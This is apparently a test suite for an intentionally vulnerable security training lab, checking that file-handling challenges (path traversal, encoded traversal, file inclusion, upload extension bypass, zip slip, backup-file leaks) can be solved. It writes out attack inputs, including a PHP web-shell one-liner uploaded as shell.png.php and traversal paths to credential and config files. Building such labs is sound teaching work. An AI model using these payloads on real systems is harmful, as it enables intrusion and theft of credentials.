import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { startTestApp, type TestApp } from "./helpers.js";
import { expectSolvedOnce, jsonPost, launch } from "./lab-harness.js";

const text = async (r: Response) => await r.text();

describe("file-handling batch 7", () => {
  let t: TestApp;
  beforeAll(async () => {
    t = await startTestApp({ apiPort: 4180, labPortStart: 7600, labPortEnd: 7660 });
  });
  afterAll(async () => {
    await t.manager.stopAll();
    await t.close();
  });

  it("fh-path-traversal-download: a real receipt downloads normally; a traversal sequence reaches the internal file", async () => {
    const lab = await launch(t, "fh-path-traversal-download");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const normal = await text(await b.fetch("/download?file=2026-09-invoice.txt"));
    expect(normal).toContain("Receipt #4471");
    expect((await b.fetch("/download?file=nonexistent.txt")).status).toBe(404);
    expect(await lab.solved()).toBe(false);

    const leak = await text(await b.fetch("/download?file=" + encodeURIComponent("../internal/db-credentials.txt")));
    expect(leak).toContain("db_password");
    await expectSolvedOnce(lab, "easy", () => b.fetch("/download?file=" + encodeURIComponent("../internal/db-credentials.txt")), xp0);
    await lab.stop();
  });

  it("fh-encoded-traversal: a literal ../ is rejected; an encoded, then double-encoded, sequence is not", async () => {
    const lab = await launch(t, "fh-encoded-traversal");
    const b = lab.browser();
    const xp0 = await lab.xp();

    expect((await b.fetch("/download?file=" + encodeURIComponent("../internal/db-credentials.txt"))).status).toBe(400);
    expect(await lab.solved()).toBe(false);

    const doubleEncoded = "%252e%252e%252finternal%252fdb-credentials.txt";
    const leak = await text(await b.fetch(`/download?file=${doubleEncoded}`));
    expect(leak).toContain("db_password");
    await expectSolvedOnce(lab, "medium", () => b.fetch(`/download?file=${doubleEncoded}`), xp0);
    await lab.stop();
  });

  it("fh-lfi-template-include: known help pages render normally; traversing to the config directory leaks it", async () => {
    const lab = await launch(t, "fh-lfi-template-include");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const normal = await text(await b.fetch("/help?page=billing-faq.txt"));
    expect(normal).toContain("Billing FAQ");
    expect((await b.fetch("/help?page=nonexistent.txt")).status).toBe(404);
    expect(await lab.solved()).toBe(false);

    const leak = await text(await b.fetch("/help?page=" + encodeURIComponent("../config/app-config.txt")));
    expect(leak).toContain("SESSION_SIGNING_KEY");
    await expectSolvedOnce(lab, "medium", () => b.fetch("/help?page=" + encodeURIComponent("../config/app-config.txt")), xp0);
    await lab.stop();
  });

  it("fh-upload-extension-bypass: real images and plain rejections behave correctly; a disguised double extension is accepted", async () => {
    const lab = await launch(t, "fh-upload-extension-bypass");
    const b = lab.browser();
    const xp0 = await lab.xp();

    expect((await jsonPost(b, "/avatar/upload", { filename: "me.png", content: "fake-png-bytes" })).status).toBe(200);
    expect(await lab.solved()).toBe(false);
    expect((await jsonPost(b, "/avatar/upload", { filename: "notes.txt", content: "plain text" })).status).toBe(415);
    expect(await lab.solved()).toBe(false);
    expect((await jsonPost(b, "/avatar/upload", { filename: "../escape.png", content: "x" })).status).toBe(400);

    const res = await jsonPost(b, "/avatar/upload", { filename: "shell.png.php", content: "<?php system($_GET['c']); ?>" });
    expect(res.status).toBe(200);
    await expectSolvedOnce(lab, "medium", () => jsonPost(b, "/avatar/upload", { filename: "second.png.php", content: "x" }), xp0);
    await lab.stop();
  });

  it("fh-zip-slip-extract: a well-behaved package installs inside themes/; a traversal entry overwrites the sibling startup script", async () => {
    const lab = await launch(t, "fh-zip-slip-extract");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const legit = await jsonPost(b, "/themes/install", { entries: [{ path: "ocean-blue/theme.css", content: "body{}" }] });
    expect(legit.status).toBe(200);
    expect((legit.body as { paths: string[] }).paths).toEqual(["/app/themes/ocean-blue/theme.css"]);
    expect(await lab.solved()).toBe(false);

    const slip = await jsonPost(b, "/themes/install", {
      entries: [{ path: "innocuous-theme/style.css", content: "body{}" }, { path: "../app/startup.sh", content: "#!/bin/sh\necho pwned\n" }],
    });
    expect(slip.status).toBe(200);
    expect((slip.body as { paths: string[] }).paths).toContain("/app/app/startup.sh");
    await expectSolvedOnce(
      lab,
      "hard",
      () => jsonPost(b, "/themes/install", { entries: [{ path: "../app/startup.sh", content: "#!/bin/sh\necho pwned-again\n" }] }),
      xp0,
    );
    await lab.stop();
  });

  it("fh-backup-file-exposure: the real rendered pages serve normally; the backup suffix leaks raw source", async () => {
    const lab = await launch(t, "fh-backup-file-exposure");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const normal = await text(await b.fetch("/static/index.html"));
    expect(normal).toContain("Welcome to SiteForge");
    expect((await b.fetch("/static/nonexistent.html")).status).toBe(404);
    expect(await lab.solved()).toBe(false);

    const leak = await text(await b.fetch("/static/index.php.bak"));
    expect(leak).toContain("Zx4#mPk9Qw");
    await expectSolvedOnce(lab, "easy", () => b.fetch("/static/index.php.bak"), xp0);
    await lab.stop();
  });
});
